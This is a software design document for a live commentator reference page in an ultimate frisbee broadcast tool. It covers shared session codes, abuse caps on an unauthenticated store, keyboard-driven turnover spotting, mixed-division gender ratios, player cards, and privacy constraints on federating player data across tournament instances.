#### How two commentators find each other: a shared code, not a login

**Do not gate this behind the Live! admin session.** That credential exists to control what goes on air. A commentator wants to sync a private reference panel with a colleague; handing them broadcast control to do it is an escalation for no reason — anyone who could sync could also blank the graphics mid-point. Two different jobs, two very different blast radii.

**A shared code is the right shape, and it is worth naming what it is: a namespace, not authentication.** It answers "which shared session am I in", not "am I allowed in". Saying so plainly matters, because nobody should believe it is protecting anything.

That is acceptable *here* and nowhere else in this system, for the reason §1 gives: nothing on this page reaches a viewer. The worst case of a guessed code is that a stranger sees, or edits, a line selection on somebody's private reference screen. Compare show state, where a bad write changes the broadcast — which is exactly why that one *is* admin-gated. The gate should match the consequence, and the consequences differ by orders of magnitude.

Practical properties that make it fit the setting:

- **Zero setup.** Two people agree on a word in the minute before the game.
- **Works with nobody available to authorise it** — a tournament often has no admin at the field, which is the same reason `/c` and `/s/` are readable without a login at all.
- **Scopes naturally**: the room is the code plus the game id, so the same code at two fields does not collide.
- **Opt-in.** A commentator working alone needs no code and should never be asked for one; entering a code is what turns sharing on.

**One thing to guard, and it is genuinely new.** This is the first place in the whole system where an *unauthenticated* request writes to disk — everything else writable sits behind the admin session. On a tournament LAN that is a non-issue; on a public host it is a small abuse surface. So the store carries the boring defences: a short fixed charset and length for codes, a cap on players per team, caps on rooms, pruning of rooms untouched for hours, and a minimum interval between writes to one room.

**Two of those caps were wrong when first written, and the way they were wrong is worth keeping on the page**, because both are the same mistake: a limit that looks like a bound but is not one.

| cap | what it looked like | why it bounded nothing |
|---|---|---|
| `MAX_ROOMS_PER_GAME` | 40 rooms per game | `prune()` globs one game's files, and *any* positive integer is an acceptable game id — it has to be, since an unauthenticated endpoint cannot be given a database lookup to do on demand. So a caller walking `game=1, 2, 3 …` collects a fresh allowance of 40 each time. Measured: 41 distinct game ids produced 41 files and nothing pruned. Fixed by `MAX_ROOMS_TOTAL`, a bound over the whole directory. |
| players per team | `MAX_PER_TEAM` 30 | It caps one team's array, but `saveTeam()` *merges* a team into whatever the room already holds and nothing capped the number of teams. Measured: twelve POSTs with twelve team ids left twelve teams in one room, growing without limit one request at a time. Fixed by `MAX_TEAMS_PER_ROOM`. |

The general lesson for anything else unauthenticated here: **check what the attacker controls, not what the caller is expected to send.** Both caps were correct for the shape of a real request and irrelevant to the shape of a hostile one.

**Assignment should be explicit, not inferred.** A small "I am covering …" control, remembered per browser. Two people silently editing the same team is the one case that produces confusion, and naming who has which team removes it.

### Entry has to be fast

Lines change every point, and a point can end in fifteen seconds. So:

- **Number-first, as §5 establishes.** A grid of jersey numbers per team, tap to toggle. Not a dropdown, not a search field.
- **Seven is the target**, so show a count and flag over- or under-selection without blocking it — a pull can go out before the commentator finishes tapping, and a stubborn form is worse than a wrong count.
- **Keep the previous line visible.** Ultimate rotates O and D lines, but there is real overlap, and re-picking from the last line is much faster than from a full roster.
- **A new point clears nothing automatically.** Tempting, but a score arrives on a poll that may be seconds late (§8), and wiping a line the commentator has just entered is worse than leaving a stale one. Offer a one-tap "new line" instead, and mark the panel stale once the score moves.

### The floating spotter: tracking the disc, and getting turnovers for free

A commentary duo splits the teams; a third person — a **spotter** — can instead track **who currently holds the disc**. That single input is worth more than anything else discussed in these documents, because *possession changes fall out of it implicitly*. Nobody records a turnover: the disc simply passes from a player on one team to a player on the other, and that transition **is** the turnover.

**Why a spotter is the right person, where nobody else was.** Two candidates were considered for possession capture and both had the same flaw (`STUDIO.md` §10.4): the scorekeeper is already tracking goals, assists, timeouts and the clock, and the broadcast operator is directing — for both, possession is *additional* work competing with their real job. A spotter watching the disc is not doing a second job. That is the entire job. It is the first proposal where the capture cost is not stolen from something else.

**Record the turnover, not the holder.** Tracking who has the disc at every moment is *continuous state maintenance* — a tap every few seconds, all game. Recording turnovers is *discrete event capture* — a handful of taps per point. Same output, far less input, and the difference is not only effort:

| | tracking the holder | recording turnovers |
|---|---|---|
| Input rate | every pass | a few per point |
| A mistake | **propagates** — mis-tap once and every derived possession after it is wrong until corrected | **is isolated** — one missing event, nothing downstream corrupted |
| Throwaway vs drop | cannot distinguish: the thrower is the holder in both cases | **can** — the spotter picks who caused it |
| Extra yield | touches per player, possession time, chains | — |

The error-isolation property is the important one. State-tracking is unforgiving in exactly the conditions this runs under: a busy point, an interrupted spotter, a moment of looking away. Event capture degrades gracefully instead — a missed turnover is a gap, not a corruption.

And the attribution point reverses a limitation I had assumed was inherent. Deriving "who lost it" from holder-tracking always blames the thrower, because the thrower is the holder whether they threw it away or the receiver dropped it. A spotter tapping *who caused it* makes that judgement themselves — which is the same judgement conventional ultimate statistics ask a statistician for, and it is the only way to get it.

So the model is:

```
starting offence        already recorded, from the `offence` game event
  + turnover events     spotter taps: when, which team gained, optionally who lost it
  = possession          derived, never tracked
```

Possession state falls out of the sequence exactly as holds and breaks already do in `classifyPoints()`. Nothing needs to be maintained.

**Attribution is optional and separable.** The bare event — *a turnover happened, this team now has it* — already yields break chance, clean holds, turnover counts and offensive efficiency. Adding *who* costs one more tap and yields per-player turnovers. Ship the first without waiting on the second.

#### The spotter interface must be keyboard-driven and eyes-free

This is the design constraint everything else follows from: **a spotter is watching the field, not the screen.** Any interaction that requires locating something visually has already failed — by the time they look up, the thing they were recording is over. So the surface is a keyboard instrument, not a form.

That also argues it should be **its own minimal page, not a panel on the dense commentator view** (§1 makes the commentator page as information-rich as a person can scan). Those are opposite jobs: one is for reading, one is for typing without looking.

What "well thought out" means concretely here:

- **One unmissable key for the primary event.** The space bar is the only key a person reliably finds without looking. A turnover is the most frequent input, so it gets the space bar and nothing else does.
- **Do not ask which team gained the disc.** Possession alternates, so a turnover *flips* it — the team is derivable from the sequence, exactly as holds and breaks already are. Asking would double the input for information already implied.
- **Attribution is a follow-up, not a mode.** After a turnover, typing a jersey number attributes it; typing nothing leaves it unattributed and the event still counts. No confirmation, no dialog, no state the spotter could be stuck in without realising.
- **Use the line to disambiguate numbers.** With seven candidates (§6 above), most digits identify a player uniquely on the first keystroke, so entry can commit immediately instead of waiting to see whether "7" becomes "77". Without line data this needs a commit key and is meaningfully worse — another reason the two features belong together.
- **Undo must be a key, and must be reachable blind.** Mistakes are certain. Backspace, one level minimum, and it must not require finding a button.
- **Feedback must be audible, not visual.** A short click on an accepted event, a different tone on undo, silence on a rejected key. Someone who is not looking at the screen has no other way to know the tap registered — this is the single easiest thing to leave out and the one that decides whether the tool is trusted.
- **No modes, or exactly one with a hard escape.** A spotter cannot discover they are in a submode. If a mode exists at all, Esc leaves it and every key behaves identically otherwise.
- **Debounce and ignore key repeat.** A leaned-on space bar must not log forty turnovers.
- **Own the keyboard globally.** A document-level handler, no focusable inputs competing for it, and `preventDefault` on space so the page never scrolls out from under them.

The screen still shows state — current possession, the last few events, the line — but purely as something to glance at between points, never as something to aim at.

**Holder tracking stays on the shelf.** It is the only route to touches per player and possession time, which nothing else can give — but it is a different order of effort and its failures are worse. Revisit only if someone has run the event-based version through a full game and wants more.

**Line data makes this feasible, which is why the two belong together.** With the line known (§6 above), a holder selector offers *seven* buttons rather than a twenty-player roster — and after a catch the likely next holders are the same seven. Without line data it is a search problem under time pressure; with it, it is a seven-way tap. Neither feature needs the other, but each makes the other markedly more usable.

**One limitation to be honest about.** Tracking the holder distinguishes *which team* lost the disc and *who was holding it*, but not whether a failed pass was a throwaway or a drop — the thrower is the holder in both cases, so the receiver's error is attributed to the thrower. Conventional ultimate statistics separate those. So this yields level A of `STUDIO.md` §10.4 cleanly and only an approximation of level B, and a per-player turnover column built on it would be quietly unfair to throwers.

**Persist it per game, and plan to send it somewhere.** A spotter's full attention across a game is a real cost, and data that is collected and then overwritten by the next fixture wastes it — every event would re-collect from scratch. One file per game and an export are the minimum; the actual destination is UltiOrganizer, so the record survives the broadcast and reaches teams and season statistics rather than sitting on a laptop. `STUDIO.md` §10.4 carries that as part of the upstream request.

**And the same rule as everywhere else: never authoritative.** A spotter's stream is overlay state. It must not be written back into the scoresheet, and putting anything derived from it on air is the separate decision described below. Persisting it does not change that — a kept file is still a broadcast artefact, not a result.

### What it unlocks, and one thing to be careful about

Line data makes several genuinely new things possible: who is on for a key point, matchup notes, how often a player is on the field, and — combined with the goal list — which lines are scoring. None of that exists in ultimate coverage today.

It also answers the "who is on this point" graphic that `STUDIO.md` §10.2 lists as impossible. **But promoting it to air is a separate decision, not a free consequence.** Commentator-entered lines are a personal reference: a missed substitution costs the commentator a moment's confusion. The same error on a lower-third states something false about a named player to the audience. If it is ever put on air, it needs the same all-or-nothing test applied to break chance (`STUDIO.md` §3.4) — and probably an explicit "confirmed" action rather than automatically mirroring whatever the commentators happen to have typed.

## 6a. Name and code, in the header

Both are setup, so both sit in the header beside each other rather than inside a mode.

The name identifies this desk to the Studio operator; the code links it. Neither belongs in the play-by-play panel, which is where the name started — invisible while preparing, and behind possession tracking, so it could not be set until somebody had already put a graphic on air. The operator reads that name when deciding whose code to enter, which makes it the *first* thing needed, not the last.

The name is typed here, kept in this browser, sent with the poll, and shown only to the operator. It is never returned to other commentators: enumerating who else is on a code is the operator's business.

## 6a2. Where the live controls live

Injury, O, D and the log button sit in the **sticky header**, beside the code that authorises them. Nothing that is tracked has controls in the body.

Two reasons, and the second is the one that decided it. The play-by-play view has the least vertical space to spare — its whole job is fourteen names at a size readable across a desk — and a panel of controls was taking a band of it. But these are also the controls pressed most often, several times a point, without looking: they are the last thing that should be allowed to scroll away. The header and the toolbar stick as one block for that reason; sticking only the header would have kept the names in view and let the buttons leave.

What remains in the body is a **reading**, not a control: turnovers this point, and the previous point beside it for comparison.

The buttons are smaller than the ones they replace, which is a real cost — the body versions were deliberately large to be hit without looking. Being permanently on screen is worth more than being large, because a button that has scrolled off cannot be hit at any size. The keyboard is unchanged and remains the fast path: `O`, `D`, `I`, `U`.

**Team stats sit at the bottom of this view**, the opposite of the prep view. There the squads scroll and the short block belongs on top so it never leaves the screen; here nothing scrolls, and a season record does not change while a point is being played.

## 6b. Gender ratio

Mixed divisions only, decided the way UltiOrganizer's own scoresheet decides it — the division name contains "mixed" (`cust/wfdf/pdfscoresheet.php:142`).

**The pattern is derivable; the labels are not.** WFDF's prescribed ratio runs A B B A · A B B A over successive points, so points 1, 4, 5, 8, 9, 12 … repeat the first point's ratio and the rest carry the other. That is taken from the same source as the printed sheet (`pdfscoresheet.php:1254`, which marks exactly those points with an asterisk), so a commentator reading this screen and a scorekeeper reading the paper cannot disagree.

What UltiOrganizer does *not* record is which ratio was chosen for point 1 — it is circled by hand on the scoresheet and nothing sends it back. So the panel asks once and only then names actual ratios. The answer is stored **with the game**, in the possession store, rather than in this browser: the stage's progression card needs the same fact, and a per-browser copy meant the person calling the game and the graphic going out could quietly disagree. Whoever holds the room code can set it, for the same reason they can set possession. Until it is set it shows the pattern rather than guessing, because guessing wrong is wrong for the entire game rather than for one point.

The ratios themselves come from the season type: outdoor is 4MMP/3FMP against 3MMP/4FMP, indoor and beach 3MMP/2FMP against 2MMP/3FMP (`pdfscoresheet.php:461-471`). `seasoninfo.type` is in the game payload already.

It shows the current point and the next three, because the useful call is "this one and the next are 4MMP, then it flips" rather than a single value. Each is one line: the point number is a caption for the ratio, not a second fact.

**Ratios are written as one side, not two.** `4MMP` rather than `4MMP/3FMP` — on a seven-a-side line four MMP means three FMP and there is nothing else it could be. The saving in characters is the smaller reason; the real one is that writing both halves forces a decision about which category is printed first, every time a ratio appears, and there is no good answer to that.

**The selector for point 1 is in the toolbar**, with the code and the other setup. It is answered once per game and then never touched, so it has no business taking a block in the panel that is read between every point.

**An unlinked desk may declare it too — on that screen alone.** The ratio is read off the paper scoresheet, and a desk that never links must not lose the ABBA panel and the picker assist over it. The declaration is kept in that browser, labelled "this screen only" wherever it shows, and the shared value stays the authority: the moment one exists it wins, the local one is dropped, and the takeover is said once in the panel rather than silently relabelling the points. Nothing local ever enters the room as a side effect — once the desk is linked, sharing the local value is its own one-click offer, because an unshared guess must not reach the stage just because a code was typed.

### 6c. Which ratio each side is winning

Once four points have been played the ratio panel adds the split: how each team has scored on the first point's ratio against the other one. "They have taken five of six on 4MMP/3FMP and are level on the other" is a real line about how a mixed game is being won, and it costs nothing — the ABBA slot of every point falls out of its number, and the goals are already in hand.

**This game only, and that is a limit rather than an omission.** A pre-game or tournament-wide version would be the more interesting stat and it cannot be built. The first point's ratio is decided per game — the scoresheet prints both options with a box to circle (`cust/wfdf/pdfscoresheet.php:475`) — so "ratio A" in one game and "ratio A" in the next are not necessarily the same ratio. Without the per-game choice recorded somewhere, adding two games' splits together produces a number that looks meaningful and is not.

That makes it another entry on the same list as possession: the pattern is derivable, the labels are not, and the fix is upstream. If UltiOrganizer recorded the first point's ratio alongside the score, every mixed game ever played would become analysable this way at once.

## 6d. Quick cards: type the shirt number — **built**

Mid-point there is no roster on screen and no time for a dialog, so the card is summoned by the thing the commentator is already looking at: the number on the shirt. Type it, and that player's compact card — number, name, the identity line, this game and the tournament, a point strip, and the prepared note, which is the payoff — pins into a fixed region directly under the lines. The strip is one cell per point so far, filled where this side scored and lettered where this player took the goal or the assist; points *played* are deliberately absent (no line history exists — a selection is kept only for the current point) and so are per-game blocks (in no payload, `STUDIO.md` §3.4), because absence must never read as "did nothing". Clicking a player's chip does the same for a mouse hand. A second card sits beside the first, which is what a matchup needs; a third replaces the oldest; Escape clears — a pending number first, then the cards. A **Keys** button in the toolbar opens the reference for all of it, plus the possession keys, in the same dialog the player sheet uses.

An earlier version mapped one key per on-field *position* — digits for the top team, a letter row for the bottom. It was a single blind keypress, and it was wrong: the keys did not mean jersey numbers, so #5 scoring invited pressing 5 and pinning whoever stood fifth in the line, and the mapping reshuffled with every line change so no muscle memory could form. Number entry types what the shirt says — nothing has to be found on the panel first, and practice compounds, because memorising jersey numbers is the job anyway.

A digit commits the moment the typed string cannot be extended into another on-field number — with at most 14 players on the pitch, `9` commits instantly unless someone wears `9x`, so the double-digit pause almost never fires; Enter commits early, Backspace edits, the typed number is shown in the toolbar so a mistype is seen, and a number nobody on the field wears evaporates. **A number both teams field pins both players**, side by side and labelled: a number resolves per team (§5), and the two-slot region is exactly the size of that ambiguity, so it is shown rather than guessed. Digits are matched on the physical key (`KeyboardEvent.code`), identical across QWERTY, QWERTZ and AZERTY — retiring the letter row dissolved the keyboard-layout question entirely, and with it the per-layout key labels.

The attention rules are §7's, one notch relaxed: the region is fixed, below the lines, overlays nothing a commentator might be reading, and nothing ever appears unasked. The relaxation is that a deliberate keypress may shift the season blocks under it — acceptable for an action the commentator chose, where §7 rules it out for an automatic one.

## 6e. Picking a legal mixed line — **built**

With matchings (§5a) and this point's ratio (§6b) in hand, the line picker stops making the commentator count. On the roster and the field view the matching is a small tinted tag — teal for FMP, violet for MMP, deliberately neither of the stereotyped colours, the term carrying the meaning and the tint only making a line scannable. On the picker the tint moves onto the chips themselves — a picker is clicked, not read, so a label under every number was clutter — the chips order by matching with the tighter quota's players first, and the per-matching count sits in the panel header beside the team name: `Harbour Herons · 3 / 7 · MMP 2 of 3 · FMP 1 of 4`.

A matching whose quota is exactly filled sets its unpicked players aside — every one of them could only make the line illegal — and unpicking somebody brings them all back; the picked stay visible, so a swap is one unpick away. Players without matching data always list last and are never hidden: absent is not a matching, and an empty spreadsheet cell must not make somebody disappear from a picker. Setting a filled group aside is a deliberate exception to "show the consequence; never block the click" (`AGENTS.md`): a displaced card is often intended, an eighth FMP never is.

The grouping decisions live in `shared/lineup.js`, pure and tested directly; the point's ratio derives from the declared first point plus the ABBA pattern (`shared/ratio.js`), so the ratio panel and the picker cannot disagree about which ratio this point is. Before anyone declares point 1's ratio, the picker is the plain flat list.

## 7. The auto-surfacing behaviour

The idea: when something happens — a goal, a block — the person involved is pulled up automatically for a few seconds, with a control to pin it. (The *deliberate* version — the commentator pulls a player up by key — is built, §6d; this section is about the automatic trigger, which is the risky half.)

This is the feature most worth getting right and the easiest to make actively harmful.

**The risk is attention, not correctness.** A commentator is watching the field. A panel that appears, moves, steals focus or shifts what is under the cursor will make them look down at exactly the moment play restarts — which is worse than never having built it. So:

- **Peripheral, never modal.** A fixed region that changes contents. It must never overlay something the commentator might be reading.
- **Nothing moves.** The panel occupies the same rectangle whether it is empty or full. Reflowing the page on every goal is the single worst thing this could do.
- **Never steals focus**, never opens a dialog, never repositions anything under the pointer.
- **Pinning is one click and obvious**, and a pinned card stays until unpinned — an auto-clear that fires while someone is mid-sentence is the same failure as popping in.
- **A queue, not a race.** Two goals in quick succession must not have the second stamp on the first; the second waits or the panel shows both.
- **Muteable.** A commentator who finds it distracting must be able to turn it off and keep the rest of the page. Assume some will.

**Trigger detection is already solved for goals.** The scoreboard detects a score change and identifies the scorer today (`lastGoalOutcome()` plus the named goal entry) — the same signal drives the HOLD/BREAK flash. A commentator page reuses that mechanism against a slower poll.

**Blocks cannot trigger anything yet.** Tournament totals are now reachable (§4), but a trigger needs to know a block *just happened*, and that means the per-game list — which is in no payload (`STUDIO.md` §3.4) and waits on the direct-database decision. Goal-triggered surfacing is the whole of what can ship first.

## 8. Latency, and why it is not a problem

A commentator's page can be several seconds behind and remain useful — they are describing what they just watched, not reacting to a wire. So it can poll the ordinary cached endpoint on the 30s game-detail cache (`STUDIO.md` §6) without any of the special handling the overlays need.

One caveat worth designing for: **the page will lag the commentator's own eyes.** They will see a goal several seconds before the panel does. So the surfaced card must be labelled with *which* goal it refers to — scorer and score — rather than implying "just now". A card that appears silently after the next point has started, with no indication of what it describes, is confusing in a way a timestamp fixes for free.

## 8a. Federation: what a second instance would add, and what makes it hard

**The idea:** UltiOrganizer and Live! instances are islands. Every tournament runs its own database, so a player's record, a club's results and a head-to-head history all end at the edge of whichever installation happened to host the event. If instances could read one another, this page could answer questions it currently cannot answer at all.

**What it unlocks is exactly the category §3 lists and §4 cannot deliver: pre-match notes.** Head-to-head history against tonight's opponent. A player's career rather than their tournament. Which of these players have been team-mates before, and where. The last time these two clubs met and what happened. Those are the lines that separate commentary from score-reading, and every one of them needs data from an event this instance never hosted.

**The abstraction already exists one level down, which is the encouraging part.** UltiOrganizer separates the per-event row from the persistent entity in both directions:

| per event | persistent | link |
|---|---|---|
| `uo_player` — one row per player **per team**, carrying `num` and that roster's goal counts | `uo_player_profile` — the person | `uo_player.profile_id` |
| `uo_team` — one club's entry into one series | `uo_club` | `uo_team.club` |

So "the same person across teams and seasons" is already a first-class concept inside one installation. `uo_player_stats` is keyed by `player_id` but carries `profile_id`, `season` and `series` alongside it — a career table in all but name. Federation is that same abstraction one level up: what `profile_id` does across seasons, a global identifier would do across instances.

**And there is precedent for anchoring a profile to a foreign system.** `uo_player_profile.ffindr_id` and `uo_team_profile.ffindr_id` are exactly that — another service's id stored against a local record, on both the person and the club. Worth being accurate about their state: nothing in `lib/`, `admin/` or `user/` writes either column. They appear only in `lib/privacy.functions.php`, which clears them on anonymisation, and `lib/data.functions.php`, which classifies them as private. The *shape* has a precedent; a working integration does not.

### The hard part is identity, not transport

Moving JSON between two instances is the easy half and not worth designing here. The problem is deciding that a player in one database and a player in another are the same person.

**A wrong merge is worse than no data.** It attributes one player's career to another, on air, under their name — and it is simultaneously a privacy failure, because it links records about two different people. Names collide, common names collide often, and people change club, country and sometimes name over a career. Anything that looks like a clean heuristic here is not one.

- **The identifier has to be issued, not derived.** Matching on name plus birthdate fails in exactly the cases it most needs to get right, and it turns every federation request into a query containing personal data. An opaque issued id does neither.
- **There is a real-world anchor rather than a registry to invent.** WFDF already issues player numbers for sanctioned events, and `uo_player_profile` already has somewhere to put one — it carries `national_id` and `accreditation_id` beside `ffindr_id`. Riding an identifier players already have, administered by a body that already administers it, sidesteps the hardest problem in the whole idea: who decides that two records are one person.
- **Clubs are the easier half and worth doing first.** They are far fewer than players, they are public entities rather than private individuals, `uo_club` already exists per instance, and a wrong club merge is embarrassing where a wrong player merge is harmful. Club head-to-head is also among the most valuable outputs. It is the part of this that could be tried without answering the identity question in its hardest form.

### Consent does not federate, and neither does erasure

`uo_player_profile.public` is a per-field opt-in **within one installation**. A player who agreed to publish their nickname at one tournament has not agreed to publish it at every tournament, to every other instance, indefinitely. Reading a local opt-in as a global one is the shortest path from a good idea to a privacy incident.

Erasure runs the same way in reverse. Today, deleting or anonymising a player is a local operation with a documented scope (`docs/privacy.md`). Once records have been copied between instances, deleting from one leaves the copies, and a deletion request has to reach every holder or it has not been honoured. **That is the strongest argument for federating by reference rather than by copy:** pull on demand from the instance that owns the record, cache briefly, and never treat a cached copy as a record of your own.

### Two constraints this project already knows

- **Instances are frequently offline.** A tournament LAN is often not on the internet at all — the same fact that shapes most of the decisions in these documents. Federated data is therefore strictly enrichment: fetched ahead of time, cached, and absent without consequence. Nothing on this page, and certainly nothing on air, may wait on another organisation's server.
- **Never assert on air what the data cannot support** (`PLAN.md` §6) bites harder here than anywhere else, because federated data arrives without the provenance a local record has. A career total assembled from three instances, one of which does not record assists, is not a career total. If it is shown at all, it is shown with its sources named — the same rule §2 applies to an incomplete block count, one scale up.

### Scope

**None of this can happen in this repository.** `PLAN.md` §6 forbids schema changes here, and federation is a UltiOrganizer-wide change to identity, privacy and the API long before it is anything a commentator sees. It is recorded in these documents because the commentator page is where its absence is felt most sharply, not because it is a task on this project's list. `UPSTREAM.md` carries it as an upstream ask.

## 9. MVP

Deliberately small, and none of it blocked on anything unresolved.

1. `commentator.php`, routed, read-only, public — same reasoning as the Studio page (`STUDIO.md` §2.5): nothing here is secret, and a commentator should not need an admin password to prepare.
2. **Header**: teams, seeds, records, field, cap state, timeouts.

   **Daylight is the default, and that is a readability decision rather than a taste one.** This page is used at the side of a pitch. A screen cannot out-emit the sun, so under a bright sky a dark interface stops being dark: the glass turns into a mirror and the reader sees their own reflection where the text should be. A light background puts the panel's brightest pixels everywhere, so reflected glare is a smaller fraction of what comes back and dark ink survives it — which is why every outdoor sign and e-reader is dark-on-light and not the other way round.

   So the day palette is not the night one inverted. It is built to a different rule: every text pair measured at **7:1 or better** (AAA, not AA), borders thick enough to survive glare rather than the hairlines that read as texture indoors, and column headers raised off 10.88px, which is the first thing sunlight erases. Measured across both modes and the player sheet, the day theme's worst pair is 7.7:1 and the night theme's is 5.23:1.

   **Not `prefers-color-scheme`.** That reports what the reader chose for their operating system months ago, indoors; it says nothing about whether the sun is on the screen right now, which is the only thing that matters here. It is a decision the reader makes on the spot, remembered per device in `localStorage`, and applied in the `<head>` before first paint — otherwise a reader who chose night gets a full white flash, which is exactly the reader least able to tolerate one.

   **Accessibility is carried structurally, not by position.** The visible header names each team once, over that team's column — which works by proximity, and proximity is exactly what a screen reader does not have. So the same naming is carried twice: a visually-hidden `<h1>` states the fixture, each header team name is an `<h2>`, and every panel and roster table below points back at the matching heading with `aria-labelledby`. The away name is flipped to the right edge with `flex-direction: row-reverse` rather than by reversing the nodes, because reversing the DOM makes the heading *read* backwards. One naming, two ways of reaching it.

   **A player with no points yet is the default state, not an exception.** On a fresh game that is most of the roster, so the dimmed `.quiet` row applies to statistics only — never to the jersey number or the name, which are the two things the row is being looked up *by*. Dimming those was both a contrast failure (3.64:1, below WCAG AA at any size here) and backwards as design: it faded the primary index of the page.

   **The header is also the column header for the page.** Everything below it is two columns of team content — team stats, then rosters, then the picker — so the team names sit in the header, home over the left column and away over the right, and no panel underneath repeats them. This started as a space problem (the name appeared three times down a page that has no vertical room to spare) and ended as a structural improvement: one naming of each team, positioned so it labels everything it applies to. The header is sticky, so the label survives scrolling a 28-player roster. On a narrow screen the columns stack and the away name moves to its own row, because a left/right header cannot label a top/bottom layout.
3. **Two rosters, side by side, sorted by jersey number** (§5) — the lookup a commentator performs most, and the reason this ranks above the event feed. Each row: number, name, pronunciation hint and pronouns where present, then goals / assists / total as columns, plus blocks where the installation records them (§4).

   **The player sheet carries everything Live! already publishes about that player**, on the principle that a commentator should not have to leave the page to reach a number a spectator could look up: this game's and the tournament's goals / assists / points, blocks where tracked, callahans, games played, points per game, division, jersey, and a game-by-game history from `entity=playerevents` — opponent, result, and what the player did in it. That history also yields the one derived figure worth the arithmetic: the team-mate this player most often scores with, in either direction, which is the connection worth naming on air. `playerevents` is fetched when a sheet opens rather than with the rosters, because 56 players' histories are a lot of requests for the handful anyone clicks.
4. **Live event feed**: the goal list in reverse, each line naming scorer and assist, with the running score and hold/break classification.
5. **Auto-surface on goal**, obeying §7, with pin and mute.
6. **Line selection** (§6), shared per team — the only piece needing a writable store, and the only one two people use at once.

Explicitly not in the MVP: search, drill-down, milestones, streak detection, bracket rendering, pre-match notes. Each is additive to a page that already works — and the most valuable pre-match notes are additive to something that does not yet exist, since head-to-head and career history need data from other instances (§8a).

**Ordering note:** items 2–4 are a single static page over one payload and are worth building first, because they are useful even if the auto-surfacing (5) is later judged too distracting to keep. Within them, the rosters come before the feed: a commentator can work from rosters alone, but not from a feed alone.

**The pronunciation and pronoun store is a separate, smaller piece**, and can ship before or after the page — an editor over a `conf/` JSON file, with the page showing a hint when one exists and nothing when it does not. Neither field blocks the other, and neither blocks the MVP; both are useful from the first entry.

7. **Prepared talking points** (§5a) — **built.** A free-text note per player in the detail overlay, shared by the room code, with the roster marking who has one. It is listed after the MVP because it was not in the original plan, and ahead of everything deferred because it needed no upstream change and no data the page did not already have.

## 10. Open questions

1. **One screen or two?** A commentator with a laptop can have this beside the broadcast; a commentator with a tablet at a field cannot. Layout should degrade to narrow.
2. **Does `pool_placements` cover bracket play?** Same open question as `PLAN.md` §7.3, and it gates any bracket display here too.
3. **How much does a commentator actually want on screen?** Unknown, and worth answering by watching one work rather than by design. The density guess in this document is the least evidenced thing in it.
4. ~~Is per-game block data worth the direct-database decision on its own?~~ **Partly answered:** tournament block *totals* turned out to need no such decision at all — they are already on the roster row behind `ShowDefenseStats` (`STUDIO.md` §3.1), and are built. The question narrows to per-*game* counts, which are still worth more here than on a graphic because a caveat is possible, and which are what a block-triggered card (§7) would need.
5. ~~Who supplies pronunciation and pronouns?~~ **Answered:** `uo_player_profile`, edited by the player themselves via `user/playerprofile.php`, published through the existing `public` opt-in whitelist (§5). The remaining question is only whether commentary teams will maintain the local staging version long enough to justify proposing the upstream field.
6. **Why does `entity=players&id=<id>` return "Invalid ID"** for an id the list endpoint just returned? If that is a bug, fixing it may expose `uo_player_profile` and remove the need for several local stores.
7. **How many commentators share one game in practice?** The per-team split (§6) assumes two. Three or more, or a floating spotter who edits both teams, would make the last-write-wins choice less comfortable and might justify per-team revisions after all.
8. **Is line entry realistic at all mid-point?** The design assumes a commentator has both hands and a spare few seconds each point. That is an assumption about how people actually work, not a technical constraint, and it is worth watching someone try before building the rest of §6 around it.
